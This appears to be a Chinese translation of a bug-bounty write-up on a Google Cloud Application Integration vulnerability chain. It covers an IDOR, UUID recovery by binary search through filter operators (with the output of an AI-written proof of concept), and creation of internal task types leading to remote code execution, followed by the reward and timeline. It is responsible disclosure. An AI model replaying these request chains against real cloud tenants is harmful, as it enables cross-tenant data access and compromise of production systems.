也就是说，仅凭测试用例 ID 就已经产生了相当大的影响。应用程序集成公开了一个:executeTest端点，可以通过 ID 运行测试用例，而实际上并不需要受害者的真实版本 UUID。  
  
Request  
  
```
POST/v1/projects/<your-project>/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest HTTP/2Host: integrations.googleapis.comAuthorization: Bearer <redacted>Content-Length: 0
```  
  
  
Response  
  
```
{  "executionId": "5d49abed-7692-47aa-8660-5cdaea92d2af","outputParameters": {    "output": 3  },"assertionResults": [    {      "assertion": {        "assertionStrategy": "ASSERT_EQUALS",        "parameter": {          "key": "output",          "value": { "intValue": "3" }        }      },      "taskNumber": "1",      "taskName": "JsonnetMapperTask",      "status": "SUCCEEDED"    }  ],"testExecutionState": "PASSED"}
```  
  
  
因此，我已经可以触发任意测试用例在任何受害者的环境中执行，但真正的目标仍然是通过之前的 IDOR 访问受害者的整个集成，为此我需要实际的版本 UUID。  
  
我在这里卡了一会儿。直到我突然想到一个办法。这个filter参数（字段2）显然支持比较运算符，比如 `&& =`。如果它也支持 `&&`>和 `&&`呢<=？如果支持，我可以锚定一个已知的测试用例 ID，然后对workflow_id字段进行二分查找，一次查找一个十六进制字符，直到重建出完整的 UUID：  
  
```
id = "<known-tc-uuid>" AND workflow_id > "<low>" AND workflow_id <= "<high>"
```  
  
  
每次请求都会缩小范围。如果测试用例仍然出现在响应中，则真实值workflow_id在范围内(low, high]；否则，它超出范围。理论上，一个 32 位十六进制 UUID 大约需要 128 次请求才能确定。  
  
我让  
Claude  
写了一个概念验证程序，结果第一次就完美运行了：  
  
```
$ python extract_by_id.py --token "<redacted>" --project 273897706296 --location "us-central1" --tc-id "60413427-4d07-4c36-bce0-66cfcdd81879"Test case: 60413427-4d07-4c36-bce0-66cfcdd81879Parent: projects/273897706296/locations/us-central1/integrations/x/versions/-Verified: target found. Starting binary search...  [ 4/32] fb1d0000-0000-0000-0000-000000000000  (16 reqs)  [ 8/32] fb1dc5f3-0000-0000-0000-000000000000  (32 reqs)  [12/32] fb1dc5f3-0380-0000-0000-000000000000  (48 reqs)  [16/32] fb1dc5f3-0380-491c-0000-000000000000  (64 reqs)  [20/32] fb1dc5f3-0380-491c-af90-000000000000  (80 reqs)  [24/32] fb1dc5f3-0380-491c-af90-5a1400000000 (96 reqs)  [28/32] fb1dc5f3-0380-491c-af90-5a141aa00000 (112 reqs)  [32/32] fb1dc5f3-0380-491c-af90-5a141aa02f56 (128 reqs)workflow_id: fb1dc5f3-0380-491c-af90-5a141aa02f56Total requests: 128
```  
  
  
我现在获得了受害者的实际集成版本 UUID。将其与GetIntegrationVersionIDOR 链接起来：  
  
```
GET/v1/projects/<your-project>/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56 HTTP/2Host: integrations.googleapis.comAuthorization: Bearer <redacted>
```  
  
  
它返回了属于另一个项目的完整集成，包括每个触发器配置、任务配置、参数绑定和创建者电子邮件：  
  
```
{  "name": "projects/<your-project>/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56","state": "DRAFT","triggerConfigs": [    {      "label": "API Trigger",      "triggerType": "API",      "triggerId": "api_trigger/TestCasePOC5_API_1"    }  ],"taskConfigs": [    {      "task": "GenericRestV2Task",      "displayName": "Call REST Endpoint",      "parameters": {        "url": { "key": "url", "value": { "stringValue": "$url$" } },        "httpMethod": { "key": "httpMethod", "value": { "stringValue": "POST" } },        "authConfigName": { "key": "authConfigName", "value": { "stringValue": "authprofiletest" } }      }    }  ],  ..."integrationParameters": [    { "key": "url", "dataType": "STRING_VALUE", "defaultValue": { "stringValue": "https://example.com" } }  ],"lastModifierEmail": "gvrptest4@gmail.com","createTime": "2026-03-22T11:10:30.087Z"}
```  
  
  
如果你还记得最初的测试用例，就会发现其中相当一部分creatorEmail字段以 `.` 结尾@google.com。所以，谷歌内部有很多团队在这个平台上运行着他们自己的集成。我接下来很自然地想到，如果这些谷歌内部集成中已经配置了GenericStubbyTypedTaskV2`.`（或其他仅限内部使用的任务，例如PythonTask`.` CreateBuganizerIssueTask、`.` 等）怎么办？任何一种情况都会使这种跨租户链变得更加糟糕。  
  
但我实际上无法进行核查。这样做意味着要遍历真实的客户数据，这会违反 Google VRP 的规则，所以我把所有数据打包后，把报告发送给了 Cloud VRP。  
  
[#配置内部任务类型]()  
  
  
但这让我开始思考，究竟是什么阻止了我创建自己的内部任务类型集成呢？  
  
如果我尝试创建一个内部任务：  
  
```
POST/v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions HTTP/2Host: integrations.googleapis.comAuthorization: Bearer <redacted>Content-Length: 1033{"taskConfigsInternal": [    {      "taskNumber": "1",      "taskName": "PythonTask",      ...      "taskEntity": {        "uiConfig": {          "taskUiModuleConfigs": [            {              "moduleId": "RPC_TYPED"            }          ]        }      },      "taskType": "ASIS_TEMPLATE",      "parameters": {        "TEST": {          "key": "test",          "value": {            "stringValue": "test"          }        }      }    }  ],  ...}
```  
  
  
这实际上可行：  
  
```
HTTP/2 200 OKContent-Type: application/json; charset=UTF-8{  "name": "projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions/304adc1b-6d09-4b2d-a070-db48b821879a","origin": "UI","snapshotNumber": "1","updateTime": "2026-05-01T07:30:07.182512Z","lockHolder": "gvrptest4@gmail.com","createTime": "2026-05-01T07:30:07.182512Z","lastModifierEmail": "gvrptest4@gmail.com","state": "DRAFT",  ...}
```  
  
  
但是当我尝试实际执行该工作流程时，却超时并出现以下错误：  
  
```
Execution timeout, cancelled graph execution. The default timeout is2minforsync execution and10minfor async execution. If you are using sync execution, please try async execution such as the Schedule API or Cloud Scheduler trigger. If you are already using async execution, please trytobreak down your integration into smaller pieces and chain them in the async way. Note any variable contains large data will also failed to upload to GCS. error/code: 'common_error_code: SYNC_EVENTBUS_EXECUTION_TIMEOUT''
```  
  
  
然而，我注意到了一些奇怪的事情。当我配置PythonTask（其中一项内部任务）、创建测试用例并执行该测试用例时，前端并没有超时，而是出现了这个可疑的错误：  
  
```
{  "1": 9,  "2": "java.io.IOException: No space left on device"}
```  
  
  
这是执行后端的一个真实异常，并非超时。无论测试用例功能运行在哪条代码路径上，它都顺利地执行到了足够深的层级，最终在实际磁盘 I/O 操作时失败。尝试同样的方法，GenericStubbyTypedTaskV2我得到了一个信息量较少但同样可疑的响应：  
  
```
Failed to executetest case. Error: Unknown Error.
```  
  
  
我查看了工作流执行日志，这才发现了实际的错误：  
  
```
{ "message": "com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ", "code": 500 }
```  
  
  
这非常可疑。我肯定有所察觉。点击：  
  
```
GET /v1/projects/<project>/locations/us-west1/integrations/ExampleTest1234:1/executions/id:downloadHost: integrations.googleapis.com
```  
  
  
可以获取完整的堆栈跟踪信息：  
  
```
com.google.enterprise.crm.exceptions.IpCanonicalCodeException: com.google.enterprise.crm.eventbus.testcase.task.mock.MockExecutionFailureException: com.google.net.rpc3.client.RpcClientException: <eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/> APPLICATION_ERROR;enterprise.crm.eventbus.stubby/EventbusStubbyCallerService.ExecuteStubbyCall;com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ;AppErrorCode=16;StartTimeMs=1774319566778;unknown;ResFormat=uncompressed;ServerTimeSec=0.00194812;LogBytes=256;FailFast;EffSecLevel=none;ReqFormat=uncompressed;ReqID=bea3d76b582d8a4;GlobalID=0;Server=[2002:a05:6670:4003:b0:ced:80ad:4c54]:4001 Code: FAILED_PRECONDITION  at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:744)  at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:725)  at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.toParameterValueType(EventParametersUtil.java:654)  at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.lambda$addEventParametersToEventMessage$0(EventParametersUtil.java:475)  at /java.base@25.0.1/java.util.stream.ReferencePipeline$3$1.accept(Unknown Source)  ...
```  
  
  
这清楚地表明，我们的变量被直接接入了ExecuteStubbyCallRequest后端。根据调整参数值时生成的堆栈跟踪信息，我猜测后端代码大致如下：  
  
```
GenericStubbyTypedTaskV2.buildRequest():    line219: setServerAddress(serverSpec) → ExecuteStubbyCallRequest.java:1123    line220: setServiceName(serviceName) → ExecuteStubbyCallRequest.java:1219    line221: setMethodName(serviceMethod) → ExecuteStubbyCallRequest.java:1313    ...
```  
  
  
所以，或许我需要提供一些参数才能让它运行？问题在于，堆栈跟踪只帮我泄露了三个已知的参数：`$1`、`$2`serverSpec和serviceName`$3`，serviceMethod但我无法通过这种方法找到更多信息。此外，谷歌将此类远程代码执行 (RCE) 漏洞视为安全事件，因此在继续操作之前，我已向谷歌安全团队申请了许可。他们很快回复了我，确认此漏洞可被利用，并建议我停止进一步测试。  
  
  
该报告很快被升级到P0/S0 级别，并获得了 🎉干得漂亮！。将近一个月后，该报告因“谷歌云生产环境遭到入侵”而获得75,000 美元的赏金，这是我迄今为止获得的最高单笔赏金。  
  
根据我与一些谷歌员工的交流，我了解到云虚拟资源计划 (VRP) 表格下的基本远程代码执行 (RCE) 奖励大致分为三个等级：  
- 5万美元：相对非特权的生产用户访问权限  
  
- 7.5万美元：特权生产用户访问权限  
  
- 10万美元：谷歌云管理员  
  
任何特定的远程代码执行 (RCE) 攻击究竟会造成多大程度的影响，完全取决于被攻破的生产环境身份可以直接访问到多少生产环境。显然，考虑到生产环境访问权限所对应的攻击面非常广阔，任何初始访问权限都极有可能用于提升权限。  
  
谷歌对此事的具体原因含糊其辞，但似乎内部团队对这条链的调查发现，其对生产环境的影响比我所展示的还要大得多，这也是它最终被评为 7.5 万美元级别的原因。  
  
[#时间线]()  
  
（第二次 RCE）  
  
2026年3月21日 - 向谷歌发送初步报告  
  
2026年3月23日 - Google 将报告分类为 P1/S1  
  
2026年3月23日 - 已将远程代码执行升级情况告知谷歌安全团队  
  
2026-03-23 - 🎉干得漂亮！报告已更新为 P0/S0  
  
2026年4月28日 -专家组裁定赔偿75,000美元。裁定理由：漏洞类别为“Google Cloud生产环境遭到入侵”。攻击者与受害者之间没有任何交互或关联。涉及Google Cloud默认产品。  
  
2026年5月6日 - 通知 Google GetIntegrationVersion RPC 仍然存在漏洞  
  
2026年5月8日 -专家组裁定追加赔偿13,337美元。裁定理由：漏洞类别为“单服务权限提升 - 写入”。攻击者与受害者之间没有任何交互或关联。涉及默认的谷歌云产品。  
  
**END**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0E13yhRIEmfrNlCS0NaL1CCU7SvwJ0Sr0nse9iak7D1Zlr6506PYeS0ZVVhnaM8RwCn38vRJpZ4hguZSE2RcDRoUsCn4xnkDKDI/640?wx_fmt=jpeg&from=appmsg "")  
  
  
公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址  
  
排版 编辑 | Ots 小安   
  
采集 翻译 | Ots Ai牛马  
  
公众号 |   
AnQuan7 (Ots安全)  
  
